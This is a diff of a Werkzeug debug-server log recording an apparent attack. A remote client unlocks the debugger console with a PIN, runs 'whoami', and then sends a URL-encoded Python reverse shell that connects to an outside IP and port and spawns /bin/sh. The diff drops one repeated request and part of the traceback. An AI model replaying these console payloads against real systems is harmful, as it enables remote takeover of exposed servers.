@@ -20,7 +20,7 @@ INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:03:00] "[37mGET /console?__debu
 INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:03:17] "[37mGET /console?__debugger__=yes&cmd=pinauth&pin=331-471-785&s=7nUcWdDfrwv0aXDppcF5 HTTP/1.1[0m" 200 -
 INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:03:38] "[37mGET /console?__debugger__=yes&cmd=import%20subprocess%3Bout%20%3D%20subprocess.Popen(%5B%27whoami%27%5D%2C%20stdout%3Dsubprocess.PIPE%2C%20stderr%3Dsubprocess.STDOUT)%3Bstdout%2Cstderr%20%3D%20out.communicate()%3Bprint(stdout)%3B&frm=0&s=7nUcWdDfrwv0aXDppcF5 HTTP/1.1[0m" 200 -
 INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:13:40] "[37mGET /console?__debugger__=yes&cmd=import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2235.222.92.192%22%2C6666))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)&frm=0&s=7nUcWdDfrwv0aXDppcF5 HTTP/1.1[0m" 200 -
-INFO:werkzeug:43.255.164.12 - - [18/Nov/2020 12:15:36] "[35m[1mGET /console?__debugger__=yes&cmd=import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2235.222.92.192%22%2C6666))%3Bos.dup2(s.fileno()%2C0)%3B%20os.dup2(s.fileno()%2C1)%3B%20os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)&frm=0&s=7nUcWdDfrwv0aXDppcF5 HTTP/1.1[0m" 500 -
+
 ERROR:werkzeug:Error on request:
 Traceback (most recent call last):
   File "/home/hsharma_gitlab_com/.local/lib/python3.6/site-packages/werkzeug/debug/console.py", line 182, in runcode
@@ -30,13 +30,6 @@ Traceback (most recent call last):
 TimeoutError: [Errno 110] Connection timed out
 
 During handling of the above exception, another exception occurred:
-
-Traceback (most recent call last):
-  File "/home/hsharma_gitlab_com/.local/lib/python3.6/site-packages/werkzeug/serving.py", line 323, in run_wsgi
-    execute(self.server.app)
-  File "/home/hsharma_gitlab_com/.local/lib/python3.6/site-packages/werkzeug/serving.py", line 312, in execute
-    application_iter = app(environ, start_response)
-  File "/home/hsharma_gitlab_com/.local/lib/python3.6/site-packages/werkzeug/debug/__init__.py", line 491, in __call__
     response = self.execute_command(request, cmd, frame)
   File "/home/hsharma_gitlab_com/.local/lib/python3.6/site-packages/werkzeug/debug/__init__.py", line 351, in execute_command
     return Response(frame.console.eval(command), mimetype="text/html")
